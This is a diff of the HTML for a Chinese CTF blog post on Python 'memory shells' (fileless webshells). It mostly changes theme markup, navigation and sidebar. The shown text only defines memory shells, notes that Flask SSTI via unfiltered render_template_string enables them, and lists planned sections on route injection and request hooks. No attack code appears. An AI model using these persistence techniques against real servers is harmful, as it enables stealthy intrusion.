@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="0x01前置知识什么是内存马？其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大 什么是python内存马？Python 内存马利用Flask框架中SSTI注入来实现, Flask框架中在web应用模板渲染的过程中用到render_template_string进行渲染, 但未对用户传输的代码进行过滤导致用户可以">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="python内存马！！！">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一些python内存马的学习">
 <meta property="og:url" content="https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="0x01前置知识什么是内存马？其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大 什么是python内存马？Python 内存马利用Flask框架中SSTI注入来实现, Flask框架中在web应用模板渲染的过程中用到render_template_string进行渲染, 但未对用户传输的代码进行过滤导致用户可以">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="python内存马！！！">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609132422946.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134240706.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609140546272.png">
@@ -26,177 +59,288 @@
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609142124488.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/3181170-20240509130942991-1709772057.png">
 <meta property="article:published_time" content="2025-06-09T02:22:51.000Z">
-<meta property="article:modified_time" content="2025-11-04T09:29:18.401Z">
+<meta property="article:modified_time" content="2025-12-01T11:22:52.858Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="python内存马">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609132422946.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>一些python内存马的学习</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/","path":"2025/06/09/一些python内存马的学习/","title":"一些python内存马的学习"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/06/09/OpenHarmonyCTF2025/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=一些python内存马的学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=一些python内存马的学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=一些python内存马的学习&body=Check out this article: https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=一些python内存马的学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=一些python内存马的学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpython%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是python内存马？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%97%A7%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02旧版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E9%A2%98%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">赛题环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">debug模式下的报错回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">路由注入的内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%96%B0%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03新版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8before-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">使用before_request方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-after-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">使用 after_request方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E5%9B%9E%E9%A1%BE%E8%B5%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04回顾赛题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05sanic%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">0x05sanic下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">路由注入</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        一些python内存马的学习
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-06-09T02:22:51.000Z" class="dt-published" itemprop="datePublished">2025-06-09</time>
-        
-        (Updated: <time datetime="2025-11-04T09:29:18.401Z" class="dt-updated" itemprop="dateModified">2025-11-04</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/python/">python</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">python内存马</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一些python内存马的学习 | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h2><h3 id="什么是内存马？"><a href="#什么是内存马？" class="headerlink" title="什么是内存马？"></a>什么是内存马？</h3><p>其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大</p>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">0x01前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">什么是内存马？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpython%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">什么是python内存马？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02%E6%97%A7%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">0x02旧版Flask下的内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E7%8E%AF%E5%A2%83"><span class="nav-number">2.2.</span> <span class="nav-text">赛题环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="nav-number">2.3.</span> <span class="nav-text">debug模式下的报错回显</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.4.</span> <span class="nav-text">路由注入的内存马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03%E6%96%B0%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">0x03新版Flask下的内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8before-request%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">使用before_request方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-after-request%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">使用 after_request方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04%E5%9B%9E%E9%A1%BE%E8%B5%9B%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">0x04回顾赛题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05sanic%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">5.</span> <span class="nav-text">0x05sanic下的内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">路由注入</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一些python内存马的学习 | root@wanth3f1ag">
+      <meta itemprop="description" content="python内存马！！！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一些python内存马的学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-09 10:22:51" itemprop="dateCreated datePublished" datetime="2025-06-09T10:22:51+08:00">2025-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:22:52" itemprop="dateModified" datetime="2025-12-01T19:22:52+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">python内存马！！！</div>
+        </div>
+      </header>
+
+    
+    
+    
